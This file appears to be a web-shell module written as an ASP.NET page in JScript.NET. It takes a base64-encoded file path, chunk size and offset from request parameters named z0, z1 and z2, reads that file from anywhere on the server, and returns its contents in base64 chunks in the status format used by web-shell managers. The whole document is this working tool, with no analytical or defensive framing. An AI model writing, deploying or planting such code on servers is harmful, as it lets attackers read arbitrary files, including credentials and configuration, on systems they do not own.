<%
function base64Decode(str) {
    if (str == null || str == "")
        return "";

    var bytes : System.Byte[] = System.Convert.FromBase64String(str);

    return System.Text.Encoding.UTF8.GetString(bytes);
}

var runModule : boolean = true;

var z0 = Request.Form("z0") || Request("z0");
var z1 = Request.Form("z1") || Request("z1");
var z2 = Request.Form("z2") || Request("z2");

if (!z0 || !z1 || !z2) {
    Response.Write("0|missing parameters");
    runModule = false;
}

if (runModule) {
    var szPath = base64Decode(z0);
    var szChunkSizeStr = base64Decode(z1);
    var szOffsetStr = base64Decode(z2);

    if (szPath == "" || szChunkSizeStr == "" || szOffsetStr == "") {
        Response.Write("0|invalid base64 input");
        runModule = false;
    }

    if (runModule) {
        var nChunkSize : int = System.Int32.Parse(szChunkSizeStr);
        var nOffset : System.Int64 = System.Int64.Parse(szOffsetStr);

        if (!System.IO.File.Exists(szPath)) {
            Response.Write("0|ERROR://file not exists: " + szPath);
            runModule = false;
        }

        if (runModule) {
            var fileInfo = new System.IO.FileInfo(szPath);
            var nFileSize : System.Int64 = fileInfo.Length;

            if (nOffset >= nFileSize) {
                Response.Write("2|");
                runModule = false;
            }

            if (runModule) {
                var fs : System.IO.FileStream = null;

                try {
                    fs = new System.IO.FileStream(
                        szPath,
                        System.IO.FileMode.Open,
                        System.IO.FileAccess.Read,
                        System.IO.FileShare.Read
                    );

                    fs.Seek(nOffset, System.IO.SeekOrigin.Begin);

                    var remaining : System.Int64 = nFileSize - nOffset;
                    var readSize : int = (nChunkSize < remaining) ? nChunkSize : int(remaining);

                    var buffer : System.Byte[] = new System.Byte[readSize];
                    var bytesRead : int = fs.Read(buffer, 0, readSize);

                    fs.Close();
                    fs = null;

                    if (bytesRead <= 0) {
                        Response.Write("2|");
                        runModule = false;
                    }

                    if (runModule) {
                        if (bytesRead < readSize) {
                            var actual : System.Byte[] = new System.Byte[bytesRead];
                            System.Array.Copy(buffer, actual, bytesRead);
                            buffer = actual;
                        }

                        var base64Result = System.Convert.ToBase64String(buffer);
                        Response.Write("1|" + base64Result);
                    }
                }
                catch (ex : System.Exception) {
                    if (fs != null) {
                        try { fs.Close(); } catch(e){}
                    }
                    Response.Write("0|ERROR://" + ex.Message);
                }
            }
        }
    }
}

%>